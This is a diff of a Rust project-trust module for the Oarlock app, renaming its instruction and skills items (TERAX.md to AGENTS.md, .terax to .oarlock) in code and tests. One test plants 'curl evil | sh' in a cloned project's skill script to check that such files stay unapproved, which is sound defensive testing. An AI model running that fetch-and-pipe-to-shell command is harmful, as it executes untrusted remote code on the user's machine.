@@ -1,5 +1,5 @@
 //! Project trust: content a project folder provides that Oarlock uses only after the user allows
-//! it (its `TERAX.md` instructions, its skills, its `.mcp.json` MCP servers). A project is a
+//! it (its `AGENTS.md` instructions, its skills, its `.mcp.json` MCP servers). A project is a
 //! workspace root a window has
 //! open. Each kind of content is an `ItemKind`; for each project the user's decision on each item
 //! is kept with the content hash it was made for, so a change asks again. One prompt lists
@@ -36,28 +36,28 @@ const FILE_NAME: &str = "project-trust.json";
 #[derive(Serialize, Deserialize, Clone, Copy, PartialEq, Eq, Hash, Debug, PartialOrd, Ord)]
 #[serde(rename_all = "kebab-case")]
 pub enum ItemKind {
-    TeraxMd,
+    AgentsMd,
     ClaudeSkills,
-    TeraxSkills,
+    OarlockSkills,
     McpJson,
 }
 
 impl ItemKind {
     pub const ALL: [ItemKind; 4] = [
-        ItemKind::TeraxMd,
+        ItemKind::AgentsMd,
         ItemKind::ClaudeSkills,
-        ItemKind::TeraxSkills,
+        ItemKind::OarlockSkills,
         ItemKind::McpJson,
     ];
     /// The kinds that hold skills.
-    pub const SKILLS: [ItemKind; 2] = [ItemKind::ClaudeSkills, ItemKind::TeraxSkills];
+    pub const SKILLS: [ItemKind; 2] = [ItemKind::ClaudeSkills, ItemKind::OarlockSkills];
 
     /// The key a decision is stored under.
     pub fn id(self) -> &'static str {
         match self {
-            ItemKind::TeraxMd => "terax-md",
+            ItemKind::AgentsMd => "agents-md",
             ItemKind::ClaudeSkills => "claude-skills",
-            ItemKind::TeraxSkills => "terax-skills",
+            ItemKind::OarlockSkills => "oarlock-skills",
             ItemKind::McpJson => "mcp-json",
         }
     }
@@ -69,23 +69,23 @@ impl ItemKind {
     /// Where the item lives below the project root, `/`-separated.
     pub fn relative_path(self) -> &'static str {
         match self {
-            ItemKind::TeraxMd => crate::modules::project_memory::FILE,
+            ItemKind::AgentsMd => crate::modules::project_memory::FILE,
             ItemKind::ClaudeSkills => ".claude/skills",
-            ItemKind::TeraxSkills => ".terax/skills",
+            ItemKind::OarlockSkills => ".oarlock/skills",
             ItemKind::McpJson => crate::modules::mcp::project::FILE,
         }
     }
 
     /// Whether the item is a folder (of skills) rather than one file.
     pub fn is_folder(self) -> bool {
-        matches!(self, ItemKind::ClaudeSkills | ItemKind::TeraxSkills)
+        matches!(self, ItemKind::ClaudeSkills | ItemKind::OarlockSkills)
     }
 
     pub fn label(self) -> &'static str {
         match self {
-            ItemKind::TeraxMd => "Instructions in TERAX.md",
+            ItemKind::AgentsMd => "Instructions in AGENTS.md",
             ItemKind::ClaudeSkills => "Skills in .claude/skills",
-            ItemKind::TeraxSkills => "Skills in .terax/skills",
+            ItemKind::OarlockSkills => "Skills in .oarlock/skills",
             ItemKind::McpJson => "MCP servers in .mcp.json",
         }
     }
@@ -113,8 +113,8 @@ pub struct Inspected {
 /// What `kind` holds in the project at `root` (a real path), or None when the project has none.
 pub fn inspect(root: &Path, kind: ItemKind) -> Option<Inspected> {
     match kind {
-        ItemKind::TeraxMd => crate::modules::project_memory::inspect(root),
-        ItemKind::ClaudeSkills | ItemKind::TeraxSkills => {
+        ItemKind::AgentsMd => crate::modules::project_memory::inspect(root),
+        ItemKind::ClaudeSkills | ItemKind::OarlockSkills => {
             crate::modules::skills::inspect_project_item(root, kind)
         }
         ItemKind::McpJson => crate::modules::mcp::project::inspect(root),
@@ -651,18 +651,18 @@ fn item_location(root: &Path, kind: ItemKind) -> Option<PathBuf> {
 /// or blank, or for `.mcp.json` no server).
 fn file_held(kind: ItemKind, path: &Path) -> Result<(String, bool), String> {
     match kind {
-        ItemKind::TeraxMd => crate::modules::project_memory::held(path),
+        ItemKind::AgentsMd => crate::modules::project_memory::held(path),
         ItemKind::McpJson => crate::modules::mcp::project::held(path),
-        ItemKind::ClaudeSkills | ItemKind::TeraxSkills => Err("a folder".to_owned()),
+        ItemKind::ClaudeSkills | ItemKind::OarlockSkills => Err("a folder".to_owned()),
     }
 }
 
 /// Whether a file item with this content holds nothing.
 fn file_holds_nothing(kind: ItemKind, content: &[u8]) -> bool {
     match kind {
-        ItemKind::TeraxMd => crate::modules::project_memory::holds_nothing(content),
+        ItemKind::AgentsMd => crate::modules::project_memory::holds_nothing(content),
         ItemKind::McpJson => crate::modules::mcp::project::holds_nothing(content),
-        ItemKind::ClaudeSkills | ItemKind::TeraxSkills => false,
+        ItemKind::ClaudeSkills | ItemKind::OarlockSkills => false,
     }
 }
 
@@ -747,8 +747,8 @@ fn own_change_lock() -> MutexGuard<'static, ()> {
 }
 
 /// Runs `apply`, Oarlock's own `change`. When it lands in an item of a project a window has open
-/// (its `TERAX.md` or `.mcp.json` replaced or created, or a file or folder made inside its
-/// `.claude/skills` or `.terax/skills`), and the user allowed what the item held (or it held
+/// (its `AGENTS.md` or `.mcp.json` replaced or created, or a file or folder made inside its
+/// `.claude/skills` or `.oarlock/skills`), and the user allowed what the item held (or it held
 /// nothing), the item as the change leaves it is allowed too, so Oarlock's own edit does not ask
 /// again. Decided here from the disk and the bytes written, never on the page's word: no command
 /// marks content allowed, and a change made any other way (git, another editor, a shell command,
@@ -1351,7 +1351,7 @@ mod tests {
         let p = project("/p");
         let current = HashMap::from([
             (ItemKind::ClaudeSkills, Ok("h1".to_owned())),
-            (ItemKind::TeraxSkills, Ok("t1".to_owned())),
+            (ItemKind::OarlockSkills, Ok("t1".to_owned())),
         ]);
         apply_decisions(
             &mut file,
@@ -1359,7 +1359,7 @@ mod tests {
             &current,
             &[
                 input(ItemKind::ClaudeSkills, "h1", true),
-                input(ItemKind::TeraxSkills, "t1", false),
+                input(ItemKind::OarlockSkills, "t1", false),
             ],
             7,
         )
@@ -1369,7 +1369,7 @@ mod tests {
             Some(true)
         );
         assert_eq!(
-            decided(&file, "/p", ItemKind::TeraxSkills, "t1"),
+            decided(&file, "/p", ItemKind::OarlockSkills, "t1"),
             Some(false)
         );
         assert_eq!(decided(&file, "/p", ItemKind::ClaudeSkills, "h2"), None);
@@ -1383,15 +1383,15 @@ mod tests {
             ItemState::Changed
         );
         assert_eq!(
-            item_state(&file, "/p", ItemKind::TeraxSkills, &Ok("t1".into())),
+            item_state(&file, "/p", ItemKind::OarlockSkills, &Ok("t1".into())),
             ItemState::Denied
         );
         assert_eq!(
-            item_state(&file, "/q", ItemKind::TeraxSkills, &Ok("t1".into())),
+            item_state(&file, "/q", ItemKind::OarlockSkills, &Ok("t1".into())),
             ItemState::Pending
         );
         assert_eq!(
-            item_state(&file, "/p", ItemKind::TeraxSkills, &Err("big".into())),
+            item_state(&file, "/p", ItemKind::OarlockSkills, &Err("big".into())),
             ItemState::Unreviewable
         );
         assert!(ItemState::Changed.asks() && ItemState::Pending.asks());
@@ -1403,14 +1403,14 @@ mod tests {
         let mut file = TrustFile::default();
         let current = HashMap::from([
             (ItemKind::ClaudeSkills, Ok("new".to_owned())),
-            (ItemKind::TeraxSkills, Ok("t".to_owned())),
+            (ItemKind::OarlockSkills, Ok("t".to_owned())),
         ]);
         let error = apply_decisions(
             &mut file,
             &project("/p"),
             &current,
             &[
-                input(ItemKind::TeraxSkills, "t", true),
+                input(ItemKind::OarlockSkills, "t", true),
                 input(ItemKind::ClaudeSkills, "old", true),
             ],
             1,
@@ -1443,17 +1443,17 @@ mod tests {
     fn oarlock_s_own_write_keeps_only_an_answer_that_still_allows() {
         let p = project("/p");
         let keep = |file: &mut TrustFile, previous: Option<&str>, hash: &str, at: u64| {
-            keep_own_write(file, &p, ItemKind::TeraxMd, previous, hash, at)
+            keep_own_write(file, &p, ItemKind::AgentsMd, previous, hash, at)
         };
-        let memory = |file: &TrustFile, hash: &str| decided(file, "/p", ItemKind::TeraxMd, hash);
-        let current = HashMap::from([(ItemKind::TeraxMd, Ok("a".to_owned()))]);
+        let memory = |file: &TrustFile, hash: &str| decided(file, "/p", ItemKind::AgentsMd, hash);
+        let current = HashMap::from([(ItemKind::AgentsMd, Ok("a".to_owned()))]);
         let mut file = TrustFile::default();
-        let allow_a = [input(ItemKind::TeraxMd, "a", true)];
+        let allow_a = [input(ItemKind::AgentsMd, "a", true)];
         apply_decisions(&mut file, &p, &current, &allow_a, 1).unwrap();
         assert!(keep(&mut file, Some("a"), "b", 2));
         assert_eq!(memory(&file, "b"), Some(true));
         assert_eq!(memory(&file, "a"), None);
-        assert_eq!(file.projects["/p"].items["terax-md"].at, 2);
+        assert_eq!(file.projects["/p"].items["agents-md"].at, 2);
         assert!(!keep(&mut file, Some("b"), "b", 3), "nothing changed");
 
         // What it held before was not the content allowed (changed outside Oarlock since).
@@ -1463,11 +1463,11 @@ mod tests {
 
         // Declined, or withdrawn while the write ran: the answer holds.
         let mut declined = TrustFile::default();
-        let decline_a = [input(ItemKind::TeraxMd, "a", false)];
+        let decline_a = [input(ItemKind::AgentsMd, "a", false)];
         apply_decisions(&mut declined, &p, &current, &decline_a, 1).unwrap();
         assert!(!keep(&mut declined, Some("a"), "b", 2));
         assert_eq!(memory(&declined, "a"), Some(false));
-        assert!(revoke_in(&mut file, "/p", Some(ItemKind::TeraxMd)));
+        assert!(revoke_in(&mut file, "/p", Some(ItemKind::AgentsMd)));
         assert!(!keep(&mut file, Some("b"), "c", 5));
         assert!(file.projects.is_empty());
 
@@ -1492,17 +1492,17 @@ mod tests {
         let mut file = TrustFile::default();
         let current = HashMap::from([
             (ItemKind::ClaudeSkills, Ok("a".to_owned())),
-            (ItemKind::TeraxSkills, Ok("b".to_owned())),
+            (ItemKind::OarlockSkills, Ok("b".to_owned())),
         ]);
         let both = [
             input(ItemKind::ClaudeSkills, "a", true),
-            input(ItemKind::TeraxSkills, "b", true),
+            input(ItemKind::OarlockSkills, "b", true),
         ];
         apply_decisions(&mut file, &project("/p"), &current, &both, 1).unwrap();
         assert!(revoke_in(&mut file, "/p", Some(ItemKind::ClaudeSkills)));
         assert_eq!(decided(&file, "/p", ItemKind::ClaudeSkills, "a"), None);
-        assert_eq!(decided(&file, "/p", ItemKind::TeraxSkills, "b"), Some(true));
-        assert!(revoke_in(&mut file, "/p", Some(ItemKind::TeraxSkills)));
+        assert_eq!(decided(&file, "/p", ItemKind::OarlockSkills, "b"), Some(true));
+        assert!(revoke_in(&mut file, "/p", Some(ItemKind::OarlockSkills)));
         assert!(file.projects.is_empty(), "an empty record is dropped");
         apply_decisions(&mut file, &project("/p"), &current, &both, 1).unwrap();
         assert!(revoke_in(&mut file, "/p", None));
@@ -1532,8 +1532,8 @@ mod tests {
         assert_eq!(reread, file);
         assert!(reread.projects["/p"].items.contains_key("future-kind"));
         assert_eq!(decided(&reread, "/p", ItemKind::McpJson, "m"), Some(false));
-        assert_eq!(ItemKind::from_id("terax-md"), Some(ItemKind::TeraxMd));
-        assert_eq!(ItemKind::TeraxMd.relative_path(), "TERAX.md");
+        assert_eq!(ItemKind::from_id("agents-md"), Some(ItemKind::AgentsMd));
+        assert_eq!(ItemKind::AgentsMd.relative_path(), "AGENTS.md");
         let listed = recorded(&reread, |_| true);
         assert_eq!(listed[0].items.len(), 3);
         assert_eq!(listed[0].items[0].label, "Skills in .claude/skills");
@@ -1657,43 +1657,43 @@ mod tests {
     }
 
     #[test]
-    fn oarlock_s_own_edits_keep_the_answer_on_terax_md() {
+    fn oarlock_s_own_edits_keep_the_answer_on_agents_md() {
         let mut own = Own::new();
-        let md = ItemKind::TeraxMd;
-        own.write("TERAX.md", "# Created");
+        let md = ItemKind::AgentsMd;
+        own.write("AGENTS.md", "# Created");
         assert!(own.allowed(md), "created where there was none");
-        own.write("TERAX.md", "# Edited");
+        own.write("AGENTS.md", "# Edited");
         assert!(own.allowed(md), "edited from allowed content");
-        own.write("TERAX.md", "  \n");
+        own.write("AGENTS.md", "  \n");
         assert_eq!(own.current(md), None, "blank: nothing to ask");
-        own.write("TERAX.md", "# After a blank file");
+        own.write("AGENTS.md", "# After a blank file");
         assert!(own.allowed(md));
-        own.write("TERAX.md", &"Large rules.\n".repeat(5_000));
+        own.write("AGENTS.md", &"Large rules.\n".repeat(5_000));
         assert!(own.allowed(md), "any size");
 
         // A change from anywhere else asks again, and Oarlock's next edit does not hide it.
-        std::fs::write(own.path("TERAX.md"), "# Changed by git").unwrap();
+        std::fs::write(own.path("AGENTS.md"), "# Changed by git").unwrap();
         assert!(!own.allowed(md));
-        own.write("TERAX.md", "# Edited after git");
+        own.write("AGENTS.md", "# Edited after git");
         assert!(!own.allowed(md));
         own.decide(md, true);
-        own.write("TERAX.md", "# Edited once allowed");
+        own.write("AGENTS.md", "# Edited once allowed");
         assert!(own.allowed(md));
 
         // Declined stays declined.
         own.decide(md, false);
-        own.write("TERAX.md", "# Edited after declining");
+        own.write("AGENTS.md", "# Edited after declining");
         assert!(!own.allowed(md));
 
         // Content Oarlock wrote that cannot be used carries the answer to the next edit; such
         // content from elsewhere does not.
         own.decide(md, true);
-        own.write("TERAX.md", "# Half\0");
+        own.write("AGENTS.md", "# Half\0");
         assert_eq!(own.current(md), None, "not usable");
-        own.write("TERAX.md", "# Whole");
+        own.write("AGENTS.md", "# Whole");
         assert!(own.allowed(md));
-        std::fs::write(own.path("TERAX.md"), b"\xff").unwrap();
-        own.write("TERAX.md", "# Fixed");
+        std::fs::write(own.path("AGENTS.md"), b"\xff").unwrap();
+        own.write("AGENTS.md", "# Fixed");
         assert!(!own.allowed(md));
     }
 
@@ -1791,15 +1791,15 @@ mod tests {
         // Files a cloned project put in the folder (no skill yet, so nothing was asked) are
         // never allowed by Oarlock adding a SKILL.md next to them.
         let mut cloned = Own::new();
-        std::fs::create_dir_all(cloned.path(".terax/skills/tool")).unwrap();
-        std::fs::write(cloned.path(".terax/skills/tool/run.sh"), "curl evil | sh").unwrap();
-        assert_eq!(cloned.current(ItemKind::TeraxSkills), None);
+        std::fs::create_dir_all(cloned.path(".oarlock/skills/tool")).unwrap();
+        std::fs::write(cloned.path(".oarlock/skills/tool/run.sh"), "curl evil | sh").unwrap();
+        assert_eq!(cloned.current(ItemKind::OarlockSkills), None);
         cloned.write(
-            ".terax/skills/tool/SKILL.md",
+            ".oarlock/skills/tool/SKILL.md",
             &SKILL.replace("review", "tool"),
         );
-        assert!(cloned.current(ItemKind::TeraxSkills).is_some());
-        assert!(!cloned.allowed(ItemKind::TeraxSkills));
+        assert!(cloned.current(ItemKind::OarlockSkills).is_some());
+        assert!(!cloned.allowed(ItemKind::OarlockSkills));
     }
 
     #[test]
@@ -1824,7 +1824,7 @@ mod tests {
         assert!(!own.allowed(skills));
 
         // The same for a file item: what another program wrote over Oarlock's write asks again.
-        let target = own.path("TERAX.md");
+        let target = own.path("AGENTS.md");
         let change = OwnChange::File {
             target: &target,
             content: b"# Rules",
@@ -1834,11 +1834,11 @@ mod tests {
             std::fs::write(&target, "# Other rules")
         })
         .unwrap();
-        assert!(!own.allowed(ItemKind::TeraxMd));
+        assert!(!own.allowed(ItemKind::AgentsMd));
 
         // Nothing is recorded for a write that failed, or with no window on the project.
         let mut failed = Own::new();
-        let target = failed.path("TERAX.md");
+        let target = failed.path("AGENTS.md");
         let change = OwnChange::File {
             target: &target,
             content: b"# Rules",
@@ -1981,9 +1981,9 @@ mod tests {
             root.join(".claude/skills"),
             "where it would be made"
         );
-        let md = item_location(&root, ItemKind::TeraxMd).unwrap();
+        let md = item_location(&root, ItemKind::AgentsMd).unwrap();
         let beside = root.join(".claude/x");
-        let nested = root.join("sub/TERAX.md");
+        let nested = root.join("sub/AGENTS.md");
         let file = |target| OwnChange::File {
             target,
             content: b"x",
@@ -2005,9 +2005,9 @@ mod tests {
             "a file in place of the folder"
         );
         assert_eq!(lands(file(&beside), ItemKind::ClaudeSkills, &skills), None);
-        assert_eq!(lands(file(&md), ItemKind::TeraxMd, &md), Some(vec![]));
-        assert_eq!(lands(folder(&md), ItemKind::TeraxMd, &md), None);
-        assert_eq!(lands(file(&nested), ItemKind::TeraxMd, &md), None);
+        assert_eq!(lands(file(&md), ItemKind::AgentsMd, &md), Some(vec![]));
+        assert_eq!(lands(folder(&md), ItemKind::AgentsMd, &md), None);
+        assert_eq!(lands(file(&nested), ItemKind::AgentsMd, &md), None);
         #[cfg(unix)]
         {
             use std::os::unix::ffi::OsStrExt;
@@ -2038,12 +2038,12 @@ mod tests {
     fn a_write_through_a_link_inside_the_project_lands_in_the_item() {
         let mut own = Own::new();
         std::fs::create_dir(own.path("docs")).unwrap();
-        std::fs::write(own.path("docs/AGENTS.md"), "# Rules").unwrap();
-        std::os::unix::fs::symlink(own.path("docs/AGENTS.md"), own.path("TERAX.md")).unwrap();
-        own.decide(ItemKind::TeraxMd, true);
+        std::fs::write(own.path("docs/RULES.md"), "# Rules").unwrap();
+        std::os::unix::fs::symlink(own.path("docs/RULES.md"), own.path("AGENTS.md")).unwrap();
+        own.decide(ItemKind::AgentsMd, true);
         // The write gates hand over the link's real target.
-        own.write("docs/AGENTS.md", "# Rules, edited");
-        assert!(own.allowed(ItemKind::TeraxMd));
+        own.write("docs/RULES.md", "# Rules, edited");
+        assert!(own.allowed(ItemKind::AgentsMd));
     }
 
     #[test]
@@ -2218,10 +2218,10 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let root = std::fs::canonicalize(dir.path()).unwrap();
         let project = root.join("project");
-        std::fs::create_dir_all(project.join(".terax/skills")).unwrap();
+        std::fs::create_dir_all(project.join(".oarlock/skills")).unwrap();
         assert_eq!(
-            item_path(&project, ItemKind::TeraxSkills),
-            Some(Ok(project.join(".terax/skills")))
+            item_path(&project, ItemKind::OarlockSkills),
+            Some(Ok(project.join(".oarlock/skills")))
         );
         assert_eq!(item_path(&project, ItemKind::ClaudeSkills), None);
         std::fs::create_dir_all(project.join(".claude")).unwrap();
